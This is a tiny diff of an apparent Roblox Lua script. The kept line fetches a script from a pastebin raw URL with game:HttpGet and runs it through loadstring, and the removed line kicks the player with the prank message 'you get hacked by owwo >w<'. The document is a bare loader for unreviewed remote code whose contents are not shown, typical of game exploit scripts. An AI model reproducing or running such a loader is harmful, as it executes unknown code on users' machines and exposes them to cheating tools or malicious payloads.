@@ -1,2 +1,1 @@
 loadstring(game:HttpGet("https://pastebin.com/raw/YN1puHZU"))()
-game.Players.LocalPlayer:Kick("you get hacked by owwo >w<")
